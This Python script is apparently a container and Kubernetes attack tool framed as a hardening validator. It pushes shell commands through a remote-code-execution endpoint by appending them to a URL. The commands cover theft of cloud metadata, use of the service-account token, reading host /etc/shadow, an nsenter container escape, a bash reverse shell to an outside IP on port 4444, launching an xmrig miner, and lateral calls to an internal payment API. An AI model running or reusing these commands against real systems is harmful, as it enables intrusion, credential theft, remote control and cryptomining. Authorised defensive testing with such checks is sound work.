#!/usr/bin/env python3
import requests
import argparse
import time
import urllib3
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Visuals:
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

def banner():
    print(f"""{Visuals.CYAN}{Visuals.BOLD}
    __             __                    __  ___              
   / /____  ______/ /____  ________  ____/  |/  /___ _____ ____
  / //_/ / / / __  / ___/ / ___/ _ \\/ ___/ /|_/ / __ `/ __ `/_  /
 / ,< / /_/ / /_/ (__  ) /__  /  __/ /__/ /  / / /_/ / /_/ / / /_
/_/|_|\\__,_/\\__,_/____/ \\___/ \\___/\\___/_/  /_/\\__,_/\\__,_/ /___/
{Visuals.RESET}{Visuals.BLUE}   Infrastructure Hardening & Exploit Validation Tool by Maaz
{Visuals.RESET}""")

def execute_exploit(url, cmd):
    try:
        # Standardized RCE execution via GET parameter
        response = requests.get(f"{url}{cmd}", timeout=7, verify=False)
        return response.text
    except Exception:
        return "CONNECTION_TIMEOUT_OR_BLOCKED"

def run_check(title, description, url, cmd):
    print(f"{Visuals.BOLD}[*] {title}{Visuals.RESET}")
    print(f"    {Visuals.DIM}{description}{Visuals.RESET}", end=" ", flush=True)
    
    for _ in range(3):
        time.sleep(0.1)
        print("·", end="", flush=True)
    
    output = execute_exploit(url, cmd)
    
    # Validation logic based on your script outputs
    failure_keywords = ["Permission denied", "Forbidden", "Connection refused", "terminated", "not found"]
    is_mitigated = any(k in output for k in failure_keywords) or output == "CONNECTION_TIMEOUT_OR_BLOCKED" or len(output.strip()) == 0

    if is_mitigated:
        print(f" {Visuals.GREEN}{Visuals.BOLD}[HARDENED]{Visuals.RESET}")
        return True
    else:
        print(f" {Visuals.RED}{Visuals.BOLD}[EXPLOITABLE]{Visuals.RESET}")
        return False

def main():
    banner()
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True, help="Target RCE URL")
    args = parser.parse_args()

    target = args.url.rstrip('/') + '/'
    stats = []

    print(f"{Visuals.YELLOW}Initializing Scan on: {Visuals.RESET}{target}")
    print("-" * 65)

    # --- PHASE 1: Information Gathering (attack_1.py) ---
    print(f"\n{Visuals.BLUE}{Visuals.BOLD}PHASE 1: RECONNAISSANCE & ENUMERATION{Visuals.RESET}")
    stats.append(run_check("Cloud Metadata Leak", "Testing access to IMDS (169.254.169.254)", target, "curl -s -m 2 http://169.254.169.254/latest/meta-data/"))
    stats.append(run_check("K8s API Discovery", "Attempting to list pods via ServiceAccount", target, "curl -k -H 'Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)' https://kubernetes.default/api/v1/pods"))
    stats.append(run_check("Egress C2 Test", "Simulating connection to external C2 server", target, "curl -s -m 2 http://google.com"))

    # --- PHASE 2: Container Escape (attack_2.py) ---
    print(f"\n{Visuals.BLUE}{Visuals.BOLD}PHASE 2: CONTAINER ESCAPE & LATERAL ACCESS{Visuals.RESET}")
    stats.append(run_check("Host Shadow Access", "Attempting to read host-level /etc/shadow", target, "ls /host/etc/shadow"))
    stats.append(run_check("Privileged Escalation", "Checking for CAP_SYS_ADMIN capabilities", target, "capsh --print"))
    stats.append(run_check("Containerd Socket", "Searching for writable Docker/Containerd sockets", target, "ls -l /run/containerd/containerd.sock"))
    stats.append(run_check("NSENTER Escape", "Attempting host namespace entry via nsenter", target, "nsenter --target 1 --mount --all -- ls /"))

    # --- PHASE 3: Runtime Security (attack_3.py) ---
    print(f"\n{Visuals.BLUE}{Visuals.BOLD}PHASE 3: RUNTIME ATTACK SIMULATION{Visuals.RESET}")
    stats.append(run_check("Reverse Shell Policy", "Executing bash reverse shell process", target, "bash -i >& /dev/tcp/1.1.1.1/4444 0>&1"))
    stats.append(run_check("Cryptominer Execution", "Simulating xmrig miner process start", target, "./xmrig --url pool.mine.com"))
    stats.append(run_check("Lateral Movement", "Attempting to call internal Payment-API", target, "curl -s payment-api.production.svc.cluster.local"))

    # --- SUMMARY ---
    total = len(stats)
    passed = stats.count(True)
    print("\n" + "═" * 65)
    print(f"{Visuals.BOLD}SCAN SUMMARY BY MAAZ{Visuals.RESET}")
    print(f"Mitigated: {passed}/{total} Threats")
    
    if passed == total:
        print(f"Security Posture: {Visuals.GREEN}{Visuals.BOLD}INFRASTRUCTURE FULLY HARDENED{Visuals.RESET}")
    elif passed > (total / 2):
        print(f"Security Posture: {Visuals.YELLOW}{Visuals.BOLD}PARTIALLY SECURED - TUNE POLICIES{Visuals.RESET}")
    else:
        print(f"Security Posture: {Visuals.RED}{Visuals.BOLD}CRITICALLY VULNERABLE{Visuals.RESET}")
    print("═" * 65)

if __name__ == "__main__":
    main()